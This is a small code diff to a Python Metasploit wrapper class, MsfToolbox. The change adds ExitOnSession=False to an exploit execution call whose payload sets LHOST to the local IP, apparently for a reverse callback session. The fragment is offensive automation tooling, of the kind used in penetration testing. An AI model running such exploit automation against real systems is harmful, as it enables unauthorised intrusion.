@@ -58,7 +58,7 @@ class MsfToolbox:
         pl['LHOST'] = self._ip
         pl['EXITFUNC'] = 'thread'
 
-        exploit.execute(payload=pl)
+        exploit.execute(payload=pl, ExitOnSession=False)
 
     def get_ip_address(self, ifname):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
